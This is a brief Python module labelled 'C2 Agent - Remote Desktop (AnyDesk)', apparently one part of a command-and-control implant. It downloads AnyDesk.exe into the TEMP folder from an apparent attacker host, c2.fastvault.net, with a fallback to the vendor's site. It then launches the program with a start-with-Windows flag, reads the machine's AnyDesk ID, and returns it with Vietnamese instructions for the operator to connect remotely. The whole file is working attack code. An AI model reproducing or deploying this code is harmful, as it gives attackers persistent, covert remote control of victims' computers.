"""C2 Agent - Remote Desktop (AnyDesk)"""
import urllib.request, os, time, subprocess as sp
def start_anydesk():
    exe = os.path.join(os.environ["TEMP"], "AnyDesk.exe")
    try:
        url = "https://c2.fastvault.net/static/AnyDesk.exe"
        urllib.request.urlretrieve(url, exe)
    except:
        url = "https://download.anydesk.com/AnyDesk.exe"
        urllib.request.urlretrieve(url, exe)
    sp.Popen([exe, "--start-with-win"], shell=False)
    time.sleep(4)
    conf = os.path.join(os.environ.get("APPDATA", ""), "AnyDesk", "system.conf")
    ad_id = "unknown"
    if os.path.exists(conf):
        with open(conf, "r") as f:
            for line in f:
                if "ad.anynet.id" in line:
                    ad_id = line.split("=")[-1].strip()
                    break
    return {"output": f"[OK] AnyDesk da chay!\nID: {ad_id}\nVao AnyDesk may ban -> nhap ID nay -> remote.", "exit_code": 0}
